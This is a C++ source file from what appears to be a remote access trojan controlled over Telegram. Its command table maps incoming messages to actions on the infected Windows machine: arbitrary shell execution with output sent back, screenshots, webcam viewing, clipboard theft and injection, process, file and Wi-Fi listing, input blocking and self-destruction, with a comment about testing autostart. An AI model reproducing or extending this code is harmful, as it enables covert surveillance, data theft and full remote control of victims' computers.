#include <vector>
#include <utility>
#include <functional>
#include <string>
#include <iostream>
#include <nlohmann/json.hpp>
#include "tools.h"
#include "execute.h"
#include "parse.h"
#include "telegram.h"
#include "globals.h"
#include "functions.h"

//need to test autostart

std::vector <std::pair<std::string, void(*)(std::string)>> functions{
	{"ALL_ID",[](std::string cmd) { telegram::Send("Dont use it with ID."); }},
	{"Status", getStatus},
	{"SetID", setID},
	{"Cmd", [](std::string cmd) { system(cmd.c_str()); }},
	{"CmdOutput", [](std::string cmd) { telegram::Send(tools::cmd_output(cmd.c_str())); }},
	{"FunctionList", [](std::string) {
		std::string list;
		for (auto& i : functions) {
			list += i.first + "\n";
		}
		telegram::Send(list);
	}},
	{"Volume", setVolume},
	{"Screenshot", Screenshot},
	{"MonitorOff", monitorOff},
	{"MonitorOn", monitorOn},
	{"ChangeCfg", [](std::string change) {tools::change_cfg(nlohmann::json::parse(change)); }},
	{"CheckCfg", [](std::string) {telegram::Send(tools::load_cfg().dump()); }},
	{"SetCursor", SetCursor},
	{"Delay", Delay},
	{"BlockCursor", BlockCursor},
	{"BlockClipboard", BlockClipboard},
	{"Press", Press}, 
	{"Hotkey", hotkeys},
	{"SendClipboard", SendClipboard},
	{"Autodestruction", Autodestruction},
	{"WriteToClipboard", WriteToClipboard},
	{"ProcessList",ProcessList},
	{"IsFileExists", IsFileExists},
	{"WebcamView",WebcamView},//isnt tested
	{"ErrorSound", [](std::string) { MessageBeep(1); }}, //Doesnt works on my pc
	{"RunningApps", RunningApps},
	{"ListOfFiles", ListOfFiles}, 
	{"WifiList", WifiList},
	{"CloseForeground",TurnCloseForeground}

};

namespace execute {
	void execute(parse::ParsedMessage PM) {
		if (PM.ID != ID)
			return;
		std::cout << "ID passed, executing: " << PM.function << " with parameters: " << PM.parameters << std::endl;

		for (auto &i : functions) {
			if (i.first == PM.function) {
				i.second(PM.parameters);
				return;
			}
		}
		telegram::Send(ID + " function: " + PM.function + " not found. Try FunctionList to check possible functions.");
	}
}